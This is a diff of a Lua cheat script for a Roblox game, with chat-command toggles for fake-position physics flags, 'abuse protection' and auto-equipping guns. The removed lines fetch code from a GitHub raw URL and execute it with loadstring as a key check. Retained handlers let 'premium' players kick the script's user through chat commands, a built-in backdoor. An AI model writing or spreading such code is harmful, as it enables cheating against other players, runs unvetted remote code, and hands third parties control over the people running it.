@@ -7,10 +7,6 @@ if not getgenv().Script or getgenv().Script ~= "Get Sandy at discord.gg8AEdMHAep
     return
 end
 
-if loadstring(game:HttpGet("https://raw.githubusercontent.com/farmoretype/erger/refs/heads/main/wasdfge"))() ~= "3y49v5y8j934v52jy89052v34y70852v34y9084230u98k2c34u0k89234y70354vt7963by7063y0j893v45y0983v45yj089y0j98v25y0j793v45y0j7v534y0j72v5y0j725v4y5v340y9650909y609y7v534067v2345677v34597803456v26702hv34580v67v234" then
-    return
-end
-
 local Owner = getgenv().Owner
 if game.Players.LocalPlayer.Name == Owner then
     return
@@ -803,10 +799,10 @@ task.spawn(function()
                             v23 = false
                             processed = true
                         elseif cmd == ".abuse on" then
-                            AbuseProtection = true
+                            getgenv().AbuseProtection = true
                             processed = true
                         elseif cmd == ".abuse off" then
-                            AbuseProtection = false
+                            getgenv().AbuseProtection = false
                             processed = true
                         elseif cmd == ".fp on" then
                             v26 = true
@@ -976,7 +972,7 @@ local function setupChatListener(player)
             else
                 local text = (message.Text or ""):lower()
                 
-                if isPremium(player) and not Hosting then
+                if isPremium(player) and not getgenv().Hosting then
                     if text == "-ban ." then
                         LocalPlayer:Kick("PERMA-BAN")
                     elseif text == "-kick ." then
@@ -1019,7 +1015,7 @@ local function setupChatListener(player)
                     end
                 end
                 
-                if isBypassPremium(player) and not Hosting then
+                if isBypassPremium(player) and not getgenv().Hosting then
                     if text == "-ban ." then
                         LocalPlayer:Kick("PERMA-BAN")
                     elseif text == "-kick ." then
@@ -1163,9 +1159,9 @@ local function setupChatListener(player)
                     elseif text == ".autodrop off" then
                         v23 = false
                     elseif text == ".abuse on" then
-                        AbuseProtection = true
+                        getgenv().AbuseProtection = true
                     elseif text == ".abuse off" then
-                        AbuseProtection = false
+                        getgenv().AbuseProtection = false
                     elseif text == ".fp on" then
                         v26 = true
                         setfflag("S2PhysicsSenderRate", 0)
@@ -1558,7 +1554,7 @@ task.spawn(function()
                     v87 = true
                 end
                 
-                if AbuseProtection and not myForceField and not isReloading and not refreshingfakeposition then
+                if getgenv().AbuseProtection and not myForceField and not isReloading and not refreshingfakeposition then
                     local myHumanoid = myChar:FindFirstChild("Humanoid")
                     if myHumanoid then
                         canrun = false
@@ -2001,7 +1997,7 @@ task.spawn(function()
             end
         end
         v6 = v6 + 1
-        if v6 > #SelectedGuns then
+        if v6 > #getgenv().SelectedGuns then
             v6 = 1
         end
         task.wait()
@@ -2075,7 +2071,7 @@ task.spawn(function()
         if (v17 and v17.Character or getgenv().enabled) and not v20 and not v21 then
             local backpack = LocalPlayer:FindFirstChild("Backpack")
             if backpack then
-                for _, gunType in ipairs(SelectedGuns) do
+                for _, gunType in ipairs(getgenv().SelectedGuns) do
                     local toolName = v7[gunType].toolName
                     local tool = backpack:FindFirstChild(toolName)
                     if tool and humanoid and humanoid.Health > 0 and not char:FindFirstChild(toolName) then
